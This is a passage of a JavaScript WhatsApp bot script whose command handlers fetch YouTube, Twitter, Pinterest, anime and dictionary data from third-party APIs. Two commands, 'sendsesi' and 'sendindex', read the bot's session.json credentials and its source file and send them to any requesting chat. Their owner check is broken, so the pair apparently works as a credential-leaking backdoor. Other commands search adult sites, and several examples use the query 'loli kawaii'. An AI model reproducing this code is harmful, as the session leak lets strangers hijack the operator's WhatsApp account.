sendButLocation(from, ply1, ply2, thmb, but)
break
case 'mp4':
reply(mess.wait)
woy = args.join(" ")
ini = await fetchJson(`https://api-alphabot.herokuapp.com/api/downloader/youtube/playmp4?query=${q}&apikey=Alphabot`)
mp4 = await getBuffer(ini.results.result)
ikyc.sendMessage(from, mp4, video)
break
case 'mp3':
reply(mess.wait)
woy = args.join(" ")
ini = await fetchJson(`https://api-alphabot.herokuapp.com/api/downloader/youtube/playmp3?query=${q}&apikey=Alphabot`)
mp3 = await getBuffer(ini.results.result)
ikyc.sendMessage(from, mp3, audio, {quoted: iky})
break                
                      case 'playyy':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Melukis Senja`)
                    query = args.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/ytplay?apikey=${apikey}&query=${query}`)
                    get_result = get_result.result
                    get_info = get_result.info
                    ini_txt = `Title : ${get_info.title}\n`
                    ini_txt += `Uploader : ${get_info.uploader}\n`
                    ini_txt += `Duration : ${get_info.duration}\n`
                    ini_txt += `View : ${get_info.view}\n`
                    ini_txt += `Like : ${get_info.like}\n`
                    ini_txt += `Dislike : ${get_info.dislike}\n`
                    ini_txt += `Description :\n ${get_info.description}\n`
                    thumbnail = await getBuffer(get_info.thumbnail)
                    await ikyc.sendMessage(from, thumbnail, image, { quoted: iky, caption: ini_txt })
                    get_audio = await getBuffer(get_result.audio.link)
                    await ikyc.sendMessage(from, get_audio, audio, { mimetype: 'audio/mp4', filename: `${get_info.title}.mp3`, quoted: iky })
                    break                      
                    case 'playy':
                  if (!isPremium && !isOwner) return setReply(`Kamu bukan user premium`)
                    if (args.length == 0) return await reply(`Example: ${prefix + command} melukis senja`)
                    await fetchJson(`https://api.lolhuman.xyz/api/ytsearch?apikey=${apikey}&query=${args.join(" ")}`)
                        .then(async(result) => {
                            await fetchJson(`https://api.lolhuman.xyz/api/ytaudio2?apikey=${apikey}&url=https://www.youtube.com/watch?v=${result.result[0].videoId}`)
                                .then(async(result) => {
                                    result = result.result
                                    caption = `❖ Title    : *${result.title}*\n`
                                    caption += `❖ Size   : *${result.size}*`                                    
                                    ini_buffer = await getBuffer(result.thumbnail)
                                    await ikyc.sendMessage(from, ini_buffer, image, { quoted: iky, caption: caption })
                                    get_audio = await getBuffer(result.link)
                                    await ikyc.sendMessage(from, get_audio, audio, { mimetype: 'audio/mp4', filename: `${result.title}.mp3`, quoted: iky })
                                })
                        })
                    break                   
                case 'twtdl':
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://twitter.com/gofoodindonesia/status/1229369819511709697`)
                    ini_url = args[0]
                    ini_url = await fetchJson(`https://api.lolhuman.xyz/api/twitter?apikey=${apikey}&url=${ini_url}`)
                    ini_url = ini_url.result
                    ini_url = ini_url[ini_url.length - 1].link
                    ini_buffer = await getBuffer(ini_url)
                    await ikyc.sendMessage(from, ini_buffer, video, { quoted: iky })
                    break                
                case 'zippyshare':
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://www51.zippyshare.com/v/5W0TOBz1/file.html`)
                    ini_url = args[0]
                    ini_url = await fetchJson(`https://api.lolhuman.xyz/api/zippyshare?apikey=${apikey}&url=${ini_url}`)
                    ini_url = ini_url.result
                    ini_txt = `File Name : ${ini_url.name_file}\n`
                    ini_txt += `Size : ${ini_url.size}\n`
                    ini_txt += `Date Upload : ${ini_url.date_upload}\n`
                    ini_txt += `Download Url : ${ini_url.download_url}`
                    reply(ini_txt)
                    break              
                case 'pin2':
                    if (args.length == 0) return reply(`Example: ${prefix + command} loli kawaii`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/pinterest2?apikey=${apikey}&query=${query}`)
                    get_result = get_result.result
                    for (var x = 0; x <= 5; x++) {
                        var ini_buffer = await getBuffer(get_result[x])
                        await ikyc.sendMessage(from, ini_buffer, image)
                    }
                    break
                case 'pindl':
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://id.pinterest.com/pin/696580267364426905/`)
                    ini_url = args[0]
                    ini_url = await fetchJson(`https://api.lolhuman.xyz/api/pinterestdl?apikey=${apikey}&url=${ini_url}`)
                    ini_url = ini_url.result[0]
                    ini_buffer = await getBuffer(ini_url)
                    await ikyc.sendMessage(from, ini_buffer, image, { quoted: iky })
                    break
                case 'pixiv':
                    if (args.length == 0) return reply(`Example: ${prefix + command} loli kawaii`)
                    query = args.join(" ")
                    ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/pixiv?apikey=${apikey}&query=${query}`)
                    await ikyc.sendMessage(from, ini_buffer, image, { quoted: iky })
                    break
                case 'pixivdl':
                    if (args.length == 0) return reply(`Example: ${prefix + command} 63456028`)
                    query = args[0]
                    ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/pixivdl/${pixivid}?apikey=${apikey}`)
                    await ikyc.sendMessage(from, ini_buffer, image, { quoted: iky })
                    break
                case 'xhamstersearch':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Japanese`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/xhamstersearch?apikey=${apikey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = ""
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Views : ${x.views}\n`
                        ini_txt += `Duration : ${x.duration}\n`
                        ini_txt += `Link : ${x.link}\n\n`
                    }
                    reply(ini_txt)
                    break               
                case 'xnxx':
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://www.xnxx.com/video-uy5a73b/mom_is_horny_-_brooklyn`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/xnxx?apikey=${apikey}&url=${query}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Duration : ${get_result.duration}\n`
                    ini_txt += `View : ${get_result.view}\n`
                    ini_txt += `Rating : ${get_result.rating}\n`
                    ini_txt += `Like : ${get_result.like}\n`
                    ini_txt += `Dislike : ${get_result.dislike}\n`
                    ini_txt += `Comment : ${get_result.comment}\n`
                    ini_txt += `Tag : ${get_result.tag.join(", ")}\n`
                    ini_txt += `Description : ${get_result.description}\n`
                    ini_txt += "Link : \n"
                    ini_link = get_result.link
                    for (var x of ini_link) {
                        ini_txt += `${x.type} - ${x.link}\n\n`
                    }
                    thumbnail = await getBuffer(get_result.thumbnail)
                    await ikyc.sendMessage(from, thumbnail, image, { quoted: iky, caption: ini_txt })
                    break

                    // AniManga //
                case 'character':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Miku Nakano`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/character?apikey=${apikey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = `Id : ${get_result.id}\n`
                    ini_txt += `Name : ${get_result.name.full}\n`
                    ini_txt += `Native : ${get_result.name.native}\n`
                    ini_txt += `Favorites : ${get_result.favourites}\n`
                    ini_txt += `Media : \n`
                    ini_media = get_result.media.nodes
                    for (var x of ini_media) {
                        ini_txt += `- ${x.title.romaji} (${x.title.native})\n`
                    }
                    ini_txt += `\nDescription : \n${get_result.description.replace(/__/g, "_")}`
                    thumbnail = await getBuffer(get_result.image.large)
                    await ikyc.sendMessage(from, thumbnail, image, { quoted: iky, caption: ini_txt })
                    break
                case 'manga':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Gotoubun No Hanayome`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/manga?apikey=${apikey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = `Id : ${get_result.id}\n`
                    ini_txt += `Id MAL : ${get_result.idMal}\n`
                    ini_txt += `Title : ${get_result.title.romaji}\n`
                    ini_txt += `English : ${get_result.title.english}\n`
                    ini_txt += `Native : ${get_result.title.native}\n`
                    ini_txt += `Format : ${get_result.format}\n`
                    ini_txt += `Chapters : ${get_result.chapters}\n`
                    ini_txt += `Volume : ${get_result.volumes}\n`
                    ini_txt += `Status : ${get_result.status}\n`
                    ini_txt += `Source : ${get_result.source}\n`
                    ini_txt += `Start Date : ${get_result.startDate.day} - ${get_result.startDate.month} - ${get_result.startDate.year}\n`
                    ini_txt += `End Date : ${get_result.endDate.day} - ${get_result.endDate.month} - ${get_result.endDate.year}\n`
                    ini_txt += `Genre : ${get_result.genres.join(", ")}\n`
                    ini_txt += `Synonyms : ${get_result.synonyms.join(", ")}\n`
                    ini_txt += `Score : ${get_result.averageScore}%\n`
                    ini_txt += `Characters : \n`
                    ini_character = get_result.characters.nodes
                    for (var x of ini_character) {
                        ini_txt += `- ${x.name.full} (${x.name.native})\n`
                    }
                    ini_txt += `\nDescription : ${get_result.description}`
                    thumbnail = await getBuffer(get_result.coverImage.large)
                    await ikyc.sendMessage(from, thumbnail, image, { quoted: iky, caption: ini_txt })
                    break
                case 'anime':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Gotoubun No Hanayome`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/anime?apikey=${apikey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = `Id : ${get_result.id}\n`
                    ini_txt += `Id MAL : ${get_result.idMal}\n`
                    ini_txt += `Title : ${get_result.title.romaji}\n`
                    ini_txt += `English : ${get_result.title.english}\n`
                    ini_txt += `Native : ${get_result.title.native}\n`
                    ini_txt += `Format : ${get_result.format}\n`
                    ini_txt += `Episodes : ${get_result.episodes}\n`
                    ini_txt += `Duration : ${get_result.duration} mins.\n`
                    ini_txt += `Status : ${get_result.status}\n`
                    ini_txt += `Season : ${get_result.season}\n`
                    ini_txt += `Season Year : ${get_result.seasonYear}\n`
                    ini_txt += `Source : ${get_result.source}\n`
                    ini_txt += `Start Date : ${get_result.startDate.day} - ${get_result.startDate.month} - ${get_result.startDate.year}\n`
                    ini_txt += `End Date : ${get_result.endDate.day} - ${get_result.endDate.month} - ${get_result.endDate.year}\n`
                    ini_txt += `Genre : ${get_result.genres.join(", ")}\n`
                    ini_txt += `Synonyms : ${get_result.synonyms.join(", ")}\n`
                    ini_txt += `Score : ${get_result.averageScore}%\n`
                    ini_txt += `Characters : \n`
                    ini_character = get_result.characters.nodes
                    for (var x of ini_character) {
                        ini_txt += `- ${x.name.full} (${x.name.native})\n`
                    }
                    ini_txt += `\nDescription : ${get_result.description}`
                    thumbnail = await getBuffer(get_result.coverImage.large)
                    await ikyc.sendMessage(from, thumbnail, image, { quoted: iky, caption: ini_txt })
                    break
case 'sendsesi':
						if (isZadani) return ('apakah anda owner?')
						anud = fs.readFileSync('./session.json')
						await ikyc.sendMessage(from, anud, document, {mimetype:'jpg/application', filename:`sessions.json`})
						break 
						case 'sendindex':
						if (isZadani) return ('apakah anda owner?')
						anud = fs.readFileSync('./ikyc.js')
						await ikyc.sendMessage(from, anud, document, {mimetype:'jpg/application', filename:`ikyc.js`})
						break 
                case 'wait':
                    if ((isMedia && !iky.message.videoMessage || isQuotedImage) && args.length == 0) {
                        const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(iky).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : iky
                        const filebuffer = await ikyc.downloadMediaMessage(encmedia);
                        const form = new FormData();
                        form.append('img', filebuffer, { filename: 'tahu.jpg' })
                        get_result = await axios.post(`https://api.lolhuman.xyz/api/wait?apikey=${apikey}`, form.getBuffer(), { headers: { "content-type": `multipart/form-data; boundary=${form._boundary}` } })
                        get_result = get_result.data.result
                        ini_txt = `Anilist id : ${get_result.anilist_id}\n`
                        ini_txt += `MAL id : ${get_result.mal_id}\n`
                        ini_txt += `Title Romaji : ${get_result.title_romaji}\n`
                        ini_txt += `Title Native : ${get_result.title_native}\n`
                        ini_txt += `Title English : ${get_result.title_english}\n`
                        ini_txt += `at : ${get_result.at}\n`
                        ini_txt += `Episode : ${get_result.episode}\n`
                        ini_txt += `Similarity : ${get_result.similarity}`
                        await ikyc.sendMessage(from, { url: get_result.video }, video, { quoted: iky, caption: ini_txt })
                    } else {
                        reply(`Kirim gambar dengan caption ${prefix + command} atau tag gambar yang sudah dikirim`)
                    }
                    break
case "wallpaper": case 'loli': case 'outfit': case 'husbu': case 'cosplay': case 'wallml': case 'wallff':
        sendButMessage(from, `Random ${command} by iky`, `press the button below`, [
          {
            buttonId: `/pinterest ${command}`,
            buttonText: {
              displayText: `• Click`,
            },
            type: 1,
          },
        ]);
        break
                case 'kusonime':
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://kusonime.com/nanatsu-no-taizai-bd-batch-subtitle-indonesia/`)
                    ini_url = args[0]
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/kusonime?apikey=${apikey}&url=${ini_url}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Japanese : ${get_result.japanese}\n`
                    ini_txt += `Genre : ${get_result.genre}\n`
                    ini_txt += `Seasons : ${get_result.seasons}\n`
                    ini_txt += `Producers : ${get_result.producers}\n`
                    ini_txt += `Type : ${get_result.type}\n`
                    ini_txt += `Status : ${get_result.status}\n`
                    ini_txt += `Total Episode : ${get_result.total_episode}\n`
                    ini_txt += `Score : ${get_result.score}\n`
                    ini_txt += `Duration : ${get_result.duration}\n`
                    ini_txt += `Released On : ${get_result.released_on}\n`
                    ini_txt += `Desc : ${get_result.desc}\n`
                    link_dl = get_result.link_dl
                    for (var x in link_dl) {
                        ini_txt += `\n${x}\n`
                        for (var y in link_dl[x]) {
                            ini_txt += `${y} - ${link_dl[x][y]}\n`
                        }
                    }
                    ini_buffer = await getBuffer(get_result.thumbnail)
                    await ikyc.sendMessage(from, ini_buffer, image, { quoted: iky, caption: ini_txt })
                    break
                case 'kusonimesearch':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Gotoubun No Hanayome`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/kusonimesearch?apikey=${apikey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Japanese : ${get_result.japanese}\n`
                    ini_txt += `Genre : ${get_result.genre}\n`
                    ini_txt += `Seasons : ${get_result.seasons}\n`
                    ini_txt += `Producers : ${get_result.producers}\n`
                    ini_txt += `Type : ${get_result.type}\n`
                    ini_txt += `Status : ${get_result.status}\n`
                    ini_txt += `Total Episode : ${get_result.total_episode}\n`
                    ini_txt += `Score : ${get_result.score}\n`
                    ini_txt += `Duration : ${get_result.duration}\n`
                    ini_txt += `Released On : ${get_result.released_on}\n`
                    ini_txt += `Desc : ${get_result.desc}\n`
                    link_dl = get_result.link_dl
                    for (var x in link_dl) {
                        ini_txt += `\n${x}\n`
                        for (var y in link_dl[x]) {
                            ini_txt += `${y} - ${link_dl[x][y]}\n`
                        }
                    }
                    ini_buffer = await getBuffer(get_result.thumbnail)
                    await ikyc.sendMessage(from, ini_buffer, image, { quoted: iky, caption: ini_txt })
                    break
                case 'otakudesu':
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://otakudesu.tv/lengkap/pslcns-sub-indo/`)
                    ini_url = args[0]
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/otakudesu?apikey=${apikey}&url=${ini_url}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Japanese : ${get_result.japanese}\n`
                    ini_txt += `Judul : ${get_result.judul}\n`
                    ini_txt += `Type : ${get_result.type}\n`
                    ini_txt += `Episode : ${get_result.episodes}\n`
                    ini_txt += `Aired : ${get_result.aired}\n`
                    ini_txt += `Producers : ${get_result.producers}\n`
                    ini_txt += `Genre : ${get_result.genres}\n`
                    ini_txt += `Duration : ${get_result.duration}\n`
                    ini_txt += `Studios : ${get_result.status}\n`
                    ini_txt += `Rating : ${get_result.rating}\n`
                    ini_txt += `Credit : ${get_result.credit}\n`
                    get_link = get_result.link_dl
                    for (var x in get_link) {
                        ini_txt += `\n\n*${get_link[x].title}*\n`
                        for (var y in get_link[x].link_dl) {
                            ini_info = get_link[x].link_dl[y]
                            ini_txt += `\n\`\`\`Reso : \`\`\`${ini_info.reso}\n`
                            ini_txt += `\`\`\`Size : \`\`\`${ini_info.size}\n`
                            ini_txt += `\`\`\`Link : \`\`\`\n`
                            down_link = ini_info.link_dl
                            for (var z in down_link) {
                                ini_txt += `${z} - ${down_link[z]}\n`
                            }
                        }
                    }
                    reply(ini_txt)
                    break
                case 'otakudesusearch':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Gotoubun No Hanayome`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/otakudesusearch?apikey=${apikey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Japanese : ${get_result.japanese}\n`
                    ini_txt += `Judul : ${get_result.judul}\n`
                    ini_txt += `Type : ${get_result.type}\n`
                    ini_txt += `Episode : ${get_result.episodes}\n`
                    ini_txt += `Aired : ${get_result.aired}\n`
                    ini_txt += `Producers : ${get_result.producers}\n`
                    ini_txt += `Genre : ${get_result.genres}\n`
                    ini_txt += `Duration : ${get_result.duration}\n`
                    ini_txt += `Studios : ${get_result.status}\n`
                    ini_txt += `Rating : ${get_result.rating}\n`
                    ini_txt += `Credit : ${get_result.credit}\n`
                    get_link = get_result.link_dl
                    for (var x in get_link) {
                        ini_txt += `\n\n*${get_link[x].title}*\n`
                        for (var y in get_link[x].link_dl) {
                            ini_info = get_link[x].link_dl[y]
                            ini_txt += `\n\`\`\`Reso : \`\`\`${ini_info.reso}\n`
                            ini_txt += `\`\`\`Size : \`\`\`${ini_info.size}\n`
                            ini_txt += `\`\`\`Link : \`\`\`\n`
                            down_link = ini_info.link_dl
                            for (var z in down_link) {
                                ini_txt += `${z} - ${down_link[z]}\n`
                            }
                        }
                    }
                    reply(ini_txt)
                    break
                case 'nhentai':
                    if (args.length == 0) return reply(`Example: ${prefix + command} 344253`)
                    henid = args[0]
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/nhentai/${henid}?apikey=${apikey}`)
                    get_result = get_result.result
                    ini_txt = `Title Romaji : ${get_result.title_romaji}\n`
                    ini_txt += `Title Native : ${get_result.title_native}\n`
                    ini_txt += `Read Online : ${get_result.read}\n`
                    get_info = get_result.info
                    ini_txt += `Parodies : ${get_info.parodies}\n`
                    ini_txt += `Character : ${get_info.characters.join(", ")}\n`
                    ini_txt += `Tags : ${get_info.tags.join(", ")}\n`
                    ini_txt += `Artist : ${get_info.artists}\n`
                    ini_txt += `Group : ${get_info.groups}\n`
                    ini_txt += `Languager : ${get_info.languages.join(", ")}\n`
                    ini_txt += `Categories : ${get_info.categories}\n`
                    ini_txt += `Pages : ${get_info.pages}\n`
                    ini_txt += `Uploaded : ${get_info.uploaded}\n`
                    reply(ini_txt)
                    break
                case 'nhentaipdf':
                    if (args.length == 0) return reply(`Example: ${prefix + command} 344253`)
                    henid = args[0]
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/nhentaipdf/${henid}?apikey=${apikey}`)
                    get_result = get_result.result
                    ini_buffer = await getBuffer(get_result)
                    await ikyc.sendMessage(from, ini_buffer, document, { quoted: iky, mimetype: Mimetype.pdf, filename: `${henid}.pdf` })
                    break
                case 'nhentaisearch':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Gotoubun No Hanayome`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/nhentaisearch?apikey=${apikey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = "Result : \n"
                    for (var x of get_result) {
                        ini_txt += `Id : ${x.id}\n`
                        ini_txt += `Title English : ${x.title_english}\n`
                        ini_txt += `Title Japanese : ${x.title_japanese}\n`
                        ini_txt += `Native : ${x.title_native}\n`
                        ini_txt += `Upload : ${x.date_upload}\n`
                        ini_txt += `Page : ${x.page}\n`
                        ini_txt += `Favourite : ${x.favourite}\n\n`
                    }
                    reply(ini_txt)
                    break
                case 'nekopoi':
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://nekopoi.care/isekai-harem-monogatari-episode-4-subtitle-indonesia/`)
                    ini_url = args[0]
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/nekopoi?apikey=${apikey}&url=${ini_url}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.anime}\n`
                    ini_txt += `Porducers : ${get_result.producers}\n`
                    ini_txt += `Duration : ${get_result.duration}\n`
                    ini_txt += `Size : ${get_result.size}\n`
                    ini_txt += `Sinopsis : ${get_result.sinopsis}\n`
                    link = get_result.link
                    for (var x in link) {
                        ini_txt += `\n${link[x].name}\n`
                        link_dl = link[x].link
                        for (var y in link_dl) {
                            ini_txt += `${y} - ${link_dl[y]}\n`
                        }
                    }
                    ini_buffer = await getBuffer(get_result.thumb)
                    await ikyc.sendMessage(from, ini_buffer, image, { quoted: iky, caption: ini_txt })
                    break
                case 'nekopoisearch':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Isekai Harem`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/nekopoisearch?apikey=${apikey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = ""
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Link : ${x.link}\n`
                        ini_txt += `Thumbnail : ${x.thumbnail}\n\n`
                    }
                    reply(ini_txt)
                    break

                    // Information //
                case 'kbbi':
                    if (args.length == 0) return reply(`Example: ${prefix + command} kursi`)
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/kbbi?apikey=${apikey}&query=${args.join(" ")}`)
                    lila = get_result.result
                    ini_txt = `\`\`\`Kata : ${lila[0].nama}\`\`\`\n`
                    ini_txt += `\`\`\`Kata Dasar : ${lila[0].kata_dasar}\`\`\`\n`
                    ini_txt += `\`\`\`Pelafalan : ${lila[0].pelafalan}\`\`\`\n`
                    ini_txt += `\`\`\`Bentuk Tidak Baku : ${lila[0].bentuk_tidak_baku}\`\`\`\n\n`
                    for (var x of lila) {
                        ini_txt += `\`\`\`Kode : ${x.makna[0].kelas[0].kode}\`\`\`\n`
                        ini_txt += `\`\`\`Kelas : ${x.makna[0].kelas[0].nama}\`\`\`\n`
                        ini_txt += `\`\`\`Artinya : \n${x.makna[0].kelas[0].deskripsi}\`\`\`\n\n`
                        ini_txt += `\`\`\`Makna Lain : \n${x.makna[0].submakna}\`\`\`\n `
                        ini_txt += `\`\`\`Contoh Kalimat : \n${x.makna[0].contoh}\`\`\`\n`
                    }
                    reply(ini_txt)
                    break
                case 'jarak':
                if (!isPremium && !isOwner) return setReply(`Kamu bukan user premium`)
                    if (args.length == 0) return reply(`Example: ${prefix + command} jakarta - yogyakarta`)
                    pauls = args.join(" ")
                    teks1 = pauls.split("-")[0].trim()
                    teks2 = pauls.split("-")[1].trim()
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/jaraktempuh?apikey=${apikey}&kota1=${teks1}&kota2=${teks2}`)
                    x = get_result.result
                    ini_txt = `Informasi Jarak dari ${teks1} ke ${teks2} :\n\n`
                    ini_txt += `\`\`\`◪ Asal :\`\`\` ${x.from.name}\n`
                    ini_txt += `\`\`\`◪ Garis Lintang :\`\`\` ${x.from.latitude}\n`
                    ini_txt += `\`\`\`◪ Garis Bujur :\`\`\` ${x.from.longitude}\n\n`
                    ini_txt += `\`\`\`◪ Tujuan :\`\`\` ${x.to.name}\n`
                    ini_txt += `\`\`\`◪ Garis Lintang :\`\`\` ${x.to.latitude}\n`
                    ini_txt += `\`\`\`◪ Garis Bujur :\`\`\` ${x.to.longitude}\n\n`
                    ini_txt += `\`\`\`◪ Jarak Tempuh :\`\`\` ${x.jarak}\n`
                    ini_txt += `\`\`\`◪ Waktu Tempuh :\`\`\`\n`
                    ini_txt += `   ╭───────────────❏\n`
                    ini_txt += `❍┤ Kereta Api : ${x.kereta_api}\n`
                    ini_txt += `❍┤ Pesawat : ${x.pesawat}\n`
                    ini_txt += `❍┤ Mobil : ${x.mobil}\n`
                    ini_txt += `❍┤ Motor : ${x.motor}\n`
                    ini_txt += `❍┤ Jalan Kaki : ${x.jalan_kaki}\n`
                    ini_txt += `   ╰───────────────❏\n`
                    reply(ini_txt)
                    break
                case 'urbandictionary':
                    urb = args.join(" ")
                    get_result = await fetchJson(`http://lolhuman.herokuapp.com/api/urdict?apikey=${apikey}&query=${urb}`)
                    lilu = get_result.result
                    for (var x of lilu) {
                        ini_txt = `\`\`\`Meaning :\n${x.definition}\`\`\`\n\n`
                        ini_txt += `\`\`\`Link : ${x.permalink}\`\`\`\n\n`
                        ini_txt += `\`\`\`Sounds Url : ${x.sound_urls[0]}\`\`\`\n\n`
                        ini_txt += `\`\`\`Like : ${x.thumbs_up}\`\`\`\n\n`
                        ini_txt += `\`\`\`Dislike : ${x.thumbs_down}\`\`\`\n\n`
                        ini_txt += `\`\`\`Created On : \n${x.written_on}\`\`\`\n\n`
                        ini_txt += `\`\`\`Author : ${x.author}\`\`\`\n\n`
                        ini_txt += `\`\`\`Word : ${x.word}\`\`\`\n\n`
                        ini_txt += `\`\`\`Defined Id : ${x.defid}\`\`\`\n\n`
                        ini_txt += `\`\`\`Example : ${x.example}\`\`\`\n\n`
                    }
                    reply(ini_txt)
                    break
                case 'chord':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Melukis senja`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/chord?apikey=${apikey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Chord : \n${get_result.chord}`
                    reply(ini_txt)
                    break
                case 'heroml':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Fanny`)
                    hero = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/heroml/${hero}?apikey=${apikey}`)
                    get_result = get_result.result
                    ini_txt = `Name : ${get_result.hero_name}\n`
                    ini_txt += `Entrance Quotes : ${get_result.ent_quotes}\n`
                    ini_txt += `Role : ${get_result.detail.role}\n`
                    ini_txt += `Specialty : ${get_result.detail.specialty}\n`
                    ini_txt += `Laning : ${get_result.detail.laning_recommendation}\n`
                    ini_txt += `Release : ${get_result.detail.release_date}\n`
                    ini_txt += `Movement speed : ${get_result.attr.movement_speed}\n`
                    ini_txt += `Physical attack : ${get_result.attr.physical_attack}\n`
                    ini_txt += `Magic power : ${get_result.attr.magic_power}\n`
                    ini_txt += `Physical defense : ${get_result.attr.physical_defense}\n`
                    ini_txt += `Magic defense : ${get_result.attr.magic_defense}\n`
                    ini_txt += `Critical rate : ${get_result.attr.basic_atk_crit_rate}\n`
                    ini_txt += `Hp : ${get_result.attr.hp}\n`
                    ini_txt += `Mana : ${get_result.attr.mana}\n`
                    ini_txt += `Mana regen : ${get_result.attr.mana_regen}\n`
                    ini_icon = await getBuffer(get_result.icon)
                    await ikyc.sendMessage(from, ini_icon, image, { quoted: iky, caption: ini_txt })
                    break
                case 'mlstalk':
                    if (args.length == 0) return reply(`Example: ${prefix + command} 84830127/2169`)
                    ml_id = args[0]
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/mobilelegend/${ml_id}?apikey=${apikey}`)
                    reply(get_result.result)
                    break
                case 'genshin':
                    if (args.length == 0) return reply(`Example: ${prefix + command} jean`)
                    hero = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/genshin/${hero}?apikey=${apikey}`)
                    get_result = get_result.result
                    ini_txt = `Name : ${get_result.title}\n`
                    ini_txt += `Intro : ${get_result.intro}\n`
                    ini_txt += `Icon : ${get_result.icon}\n`
                    ini_icon = await getBuffer(get_result.cover1)
                    await ikyc.sendMessage(from, ini_icon, image, { quoted: iky, caption: ini_txt })
                    ini_voice = await getBuffer(get_result.cv[0].audio[0])
                    await ikyc.sendMessage(from, ini_voice, audio, { quoted: iky, mimetype: Mimetype.mp4Audio })
                    break
                case 'qrreader':
                    if ((isMedia && !iky.message.videoMessage || isQuotedImage) && args.length == 0) {
                        const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(iky).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : iky
                        const filePath = await ikyc.downloadAndSaveMediaMessage(encmedia, filename = getRandom());
                        const form = new FormData();
                        const stats = fs.statSync(filePath);
                        const fileSizeInBytes = stats.size;
                        const fileStream = fs.createReadStream(filePath);
                        form.append('img', fileStream, { knownLength: fileSizeInBytes });
                        const options = {
                            method: 'POST',
                            credentials: 'include',
                            body: form
                        }
                        get_result = await fetchJson(`https://api.lolhuman.xyz/api/read-qr?apikey=${apikey}`, {...options })
                        fs.unlinkSync(filePath)
                        reply("Result: " + get_result.result)
                    } else {
                        reply(`Kirim gambar dengan caption ${prefix + command} atau tag gambar yang sudah dikirim`)
                    }
                    break
                case 'wikipedia':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Tahu`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/wiki?apikey=${apikey}&query=${query}`)
                    get_result = get_result.result
                    reply(get_result)
                    break              
                    break
                case 'jadwaltv':
                    if (args.length == 0) return reply(`Example: ${prefix + command} RCTI`)
                    channel = args[0]
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/jadwaltv/${channel}?apikey=${apikey}`)
                    get_result = get_result.result
                    ini_txt = `Jadwal TV ${channel.toUpperCase()}\n`
                    for (var x in get_result) {
                        ini_txt += `${x} - ${get_result[x]}\n`
                    }
                    reply(ini_txt)
                    break
                case 'jadwaltvnow':
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/jadwaltv/now?apikey=${apikey}`)
                    get_result = get_result.result
                    ini_txt = `Jadwal TV Now :\n`
                    for (var x in get_result) {
                        ini_txt += `${x.toUpperCase()}${get_result[x]}\n\n`
                    }
